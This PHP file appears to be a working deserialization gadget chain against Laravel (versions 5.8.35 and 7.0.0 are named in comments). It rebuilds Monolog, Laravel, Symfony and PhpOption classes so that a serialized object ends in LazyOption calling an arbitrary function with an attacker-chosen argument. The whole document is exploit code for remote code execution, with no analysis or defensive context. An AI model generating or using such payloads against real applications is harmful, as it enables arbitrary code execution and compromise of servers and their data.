<?php

namespace Monolog\Handler{
    class RollbarHandler{
        private $hasRecords;
        //protected $rollbarNotifier;
        protected $rollbarLogger;

        function __construct($function,$paramter)
        {
            $this->hasRecords = true;
            //$this->rollbarNotifier = new \Illuminate\Foundation\Support\Providers\RouteServiceProvider($function,$paramter);//laravel5.8.35
            $this->rollbarLogger = new \Illuminate\Foundation\Support\Providers\RouteServiceProvider($function,$paramter);//laravel7.0.0
        }
    }
}

namespace Illuminate\Foundation\Support\Providers{
    class RouteServiceProvider{
        protected $app;

        function __construct($function,$paramter)
        {
            $this->app = new \Illuminate\View\Factory($function,$paramter);
        }
    }
}

namespace Illuminate\View{
    class Factory{
        protected $finder;

        function __construct($function,$paramter)
        {
            $this->finder = new \Symfony\Component\Console\Application($function,$paramter);
        }

    }
}

namespace Symfony\Component\Console{
    class Application{
        private $initialized;
        private $commands;
        private $commandLoader;

        function __construct($function,$paramter)
        {
            $this->initialized = true;
            $this->commandLoader = new \Illuminate\Cache\Repository($function,$paramter);
            $this->commands = [new \Illuminate\Foundation\AliasLoader()];
        }
    }
}

namespace Illuminate\Foundation{
    class AliasLoader{
        protected $aliases;

        function __construct()
        {
            $this->aliases = ["key"];   
        }
    }
}

namespace Illuminate\Cache{
    class Repository{
        protected $store;

        function __construct($function,$paramter)
        {
            $this->store = new \PhpOption\LazyOption($function,$paramter);   
        }
    }
}

namespace PhpOption{
    class LazyOption{
        private $option;
        private $callback;
        private $arguments;

        function __construct($function,$paramter)
        {
            $this->callback = $function;
            $this->arguments = [$paramter];
        }
    }
}
